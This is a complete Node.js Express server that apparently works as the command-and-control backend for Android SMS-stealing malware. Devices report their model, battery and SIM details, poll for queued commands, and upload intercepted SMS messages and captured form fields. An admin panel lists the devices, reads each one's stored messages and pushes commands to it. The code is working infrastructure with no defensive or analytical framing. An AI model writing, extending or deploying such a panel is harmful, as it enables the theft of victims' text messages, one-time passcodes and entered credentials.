const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');

// ===== CONFIG =====
const PORT = 3000;

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname, 'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});

// ===== EXPRESS APP =====
const app = express();
app.use(cors()); // Enable CORS for all routes
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ===== RUNTIME DATA =====
const devices = new Map();

// ===== UTILS =====
function readQueue() { return fs.readJsonSync(QUEUE_FILE, { throws: false }) || {}; }
function writeQueue(q) { fs.writeJsonSync(QUEUE_FILE, q, { spaces: 2 }); }
function addCommand(uuid, cmd) {
  const q = readQueue();
  q[uuid] = q[uuid] || [];
  q[uuid].push(cmd);
  writeQueue(q);
}

// ===== ROUTES =====
app.get('/', (_, res) => res.redirect('/admin.html'));

// Device connect
app.post('/connect', (req, res) => {
  console.log('Received connect request body:', req.body);
  const { uuid, model, battery, sim1, sim2 } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });
  res.sendStatus(200);
});

// Commands poll
app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('missing uuid');
  const q = readQueue();
  const cmds = q[uuid] || [];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

// SMS route
app.post('/sms', (req, res) => {
  const { uuid, from, body, sim, timestamp, battery } = req.body;
  if (!uuid || !from || !body) return res.status(400).send('missing fields');

  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
  const ts = new Date(timestamp || Date.now());

  const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
  const list = fs.existsSync(smsFile) ? fs.readJsonSync(smsFile) : [];
  list.unshift({ from, body, sim, battery, timestamp: ts.getTime() });
  fs.writeJsonSync(smsFile, list.slice(0, 500), { spaces: 2 });

  res.sendStatus(200);
});

// HTML form submit
app.post('/html-form-data', (req, res) => {
  const { uuid, ...fields } = req.body;
  if (!uuid) return res.status(400).send('missing uuid');

  const fp = path.join(STORAGE_DIR, `${uuid}.json`);
  fs.writeJsonSync(fp, fields, { spaces: 2 });

  res.sendStatus(200);
});

// ===== ADMIN PANEL API =====
app.get('/api/devices', (req, res) => {
    const devicesObj = {};
    for (const [uuid, device] of devices.entries()) {
        devicesObj[uuid] = device;
    }
    res.json(devicesObj);
});

app.get('/api/sms/:uuid', (req, res) => {
    const { uuid } = req.params;
    const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
    if (fs.existsSync(smsFile)) {
        res.json(fs.readJsonSync(smsFile));
    } else {
        res.json([]);
    }
});

app.post('/api/commands/:uuid', (req, res) => {
    const { uuid } = req.params;
    const command = req.body;
    addCommand(uuid, command);
    res.sendStatus(200);
});

// ===== START SERVER =====
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
